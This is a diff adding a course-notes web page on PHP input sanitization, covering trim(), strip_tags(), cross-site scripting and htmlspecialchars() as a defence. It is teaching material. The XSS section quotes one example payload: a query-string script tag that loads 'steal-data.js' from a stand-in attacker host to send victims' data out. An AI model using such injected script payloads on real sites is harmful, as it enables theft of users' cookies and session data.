@@ -1,0 +1,211 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>SDEV255 - PHP - Sanitization</title>
+    <link
+      rel="icon"
+      type="image/png"
+      sizes="32x32"
+      href="https://mpjovanovich.github.io/course-notes/assets/images/favicon-32x32.png"
+    />
+    <link
+      rel="icon"
+      type="image/png"
+      sizes="16x16"
+      href="https://mpjovanovich.github.io/course-notes/assets/images/favicon-16x16.png"
+    />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Arimo:ital,wght@0,400;0,700;1,400;1,700&family=Roboto:ital,wght@0,400;1,400;1,700&display=swap"
+      rel="stylesheet"
+    />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,400;1,400;1,700&display=swap"
+      rel="stylesheet"
+    />
+    <link
+      rel="stylesheet"
+      href="https://mpjovanovich.github.io/course-notes/assets/css/styles.css"
+    />
+    <link
+      rel="stylesheet"
+      href="https://mpjovanovich.github.io/course-notes/assets/css/highlight.css"
+    />
+  </head>
+  <body>
+    <h1 class="breadcrumb">
+      <a href="https://mpjovanovich.github.io/course-notes/SDEV255/index.html"
+        >SDEV255</a
+      >&nbsp;&gt;&nbsp;<a href="">PHP - Sanitization</a>
+    </h1>
+    <ul>
+      <li>
+        <a href="#sanitization">Sanitization</a>
+        <ul>
+          <li>
+            <a href="#validation-vs-sanitization">Validation vs Sanitization</a>
+          </li>
+          <li>
+            <a href="#purpose-of-sanitization">Purpose of Sanitization</a>
+          </li>
+          <li>
+            <a href="#removing-unwanted-values">Removing Unwanted Values</a>
+            <ul>
+              <li><a href="#trim">trim()</a></li>
+              <li><a href="#strip_tags">strip_tags()</a></li>
+            </ul>
+          </li>
+          <li>
+            <a href="#escaping-values">Escaping Values</a>
+            <ul>
+              <li>
+                <a href="#cross-site-scripting-xss"
+                  >Cross-Site Scripting (XSS)</a
+                >
+                <ul>
+                  <li><a href="#how-xss-works">How XSS Works</a></li>
+                  <li><a href="#xss-example">XSS Example</a></li>
+                </ul>
+              </li>
+              <li><a href="#htmlspecialchars">htmlspecialchars()</a></li>
+            </ul>
+          </li>
+          <li><a href="#topics-for-later">Topics for Later</a></li>
+        </ul>
+      </li>
+    </ul>
+    <h1 id="sanitization">Sanitization</h1>
+    <h2 id="validation-vs-sanitization">Validation vs Sanitization</h2>
+    <p>
+      <strong>Validation</strong> - is the process of ensuring that the input
+      matches the expected format, range, type, length, etc.
+    </p>
+    <p>
+      <strong>Sanitization</strong> - is the process of removing unwanted
+      characters, whitespace, HTML tags, etc.
+    </p>
+    <h2 id="purpose-of-sanitization">Purpose of Sanitization</h2>
+    <ul>
+      <li>Prevents malicious code from being injected into application</li>
+      <li>
+        Prevents unwanted characters from being
+        <ul>
+          <li>Displayed to the user</li>
+          <li>Stored in database</li>
+          <li>Stored in files</li>
+          <li>Sent to other applications</li>
+        </ul>
+      </li>
+    </ul>
+    <h2 id="removing-unwanted-values">Removing Unwanted Values</h2>
+    <h3 id="trim-">trim()</h3>
+    <ul>
+      <li>Removes whitespace from beginning and end of a string</li>
+      <li>May optionally specify which characters to remove</li>
+    </ul>
+    <pre><code class="language-php"><span class="hljs-meta">&lt;?php</span>
+$cleanedInput = trim($userInput);
+<span class="hljs-meta">?&gt;</span>
+</code></pre>
+    <h3 id="strip_tags-">strip_tags()</h3>
+    <ul>
+      <li>Removes HTML tags from a string</li>
+      <li>May optionally specify which tags to allow</li>
+    </ul>
+    <pre><code class="language-php"><span class="hljs-meta">&lt;?php</span>
+$cleanedInput = strip_tags($userInput);
+<span class="hljs-meta">?&gt;</span>
+</code></pre>
+    <h2 id="escaping-values">Escaping Values</h2>
+    <p>
+      <strong>Escaping</strong> - is the process of converting special
+      characters to their HTML entity equivalents.
+    </p>
+    <h3 id="cross-site-scripting-xss-">Cross-Site Scripting (XSS)</h3>
+    <p>
+      <strong>Cross-Site Scripting (XSS)</strong> - is a type of injection
+      attack where malicious scripts are injected into trusted websites.
+    </p>
+    <p>The scripts may then:</p>
+    <ul>
+      <li>Steal cookies and session tokens</li>
+      <li>Redirect the user to another website</li>
+      <li>Send content to other applications</li>
+    </ul>
+    <h4 id="how-xss-works">How XSS Works</h4>
+    <ol>
+      <li>
+        Hacker visits a website and probes for query string vulnerabilities.
+      </li>
+    </ol>
+    <figure>
+      <span
+        ><img
+          src="images/hacker.jpg"
+          alt="Figure"
+          style="width: 40%; height: auto"
+      /></span>
+    </figure>
+    <ol start="2">
+      <li>
+        <p>Hacker finds query string named <code>q</code> is not sanitized.</p>
+      </li>
+      <li>
+        <p>
+          Hacker tricks other people into visiting website with following query
+          string:
+          <code
+            >q=&lt;script
+            src=http://really-terrible-site/steal-data.js&gt;&lt;/script&gt;</code
+          >
+        </p>
+      </li>
+      <li>
+        <p>
+          JS file runs on victim&#39;s browser and sends data to hacker&#39;s
+          website.
+        </p>
+      </li>
+      <li><p>Hacker sells data on the dark web and buys yacht.</p></li>
+    </ol>
+    <figure>
+      <span
+        ><img
+          src="https://media.boatsnews.com/src/images/news/articles/ima-computer-science-screen-37738.webp"
+          alt="Figure"
+          style="width: 40%; height: auto"
+      /></span>
+    </figure>
+    <h4 id="xss-example">XSS Example</h4>
+    <p class="demo">Walkthrough</p>
+
+    <p>
+      <a href="http://localhost/phpbook/section_b/c06/"
+        >Text: Example of an XSS Attack</a
+      >
+    </p>
+    <h3 id="htmlspecialchars-">htmlspecialchars()</h3>
+    <ul>
+      <li>Converts special characters to HTML entities</li>
+      <li>
+        May optionally specify which characters to convert and the character
+        encoding
+      </li>
+    </ul>
+    <pre><code class="language-php"><span class="hljs-meta">&lt;?php</span>
+$input = <span class="hljs-string">'&lt;script&gt;alert("XSS");&lt;/script&gt;'</span>;
+<span class="hljs-meta">?&gt;</span>
+
+&lt;p&gt;<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> htmlspecialchars($input, ENT_QUOTES, <span class="hljs-string">'UTF-8'</span>); <span class="hljs-meta">?&gt;</span>&lt;/p
+</code></pre>
+    <h2 id="topics-for-later">Topics for Later</h2>
+    <p>We have not covered these yet, but santization is also important for:</p>
+    <ul>
+      <li>Database queries</li>
+      <li>File uploads</li>
+    </ul>
+  </body>
+</html>
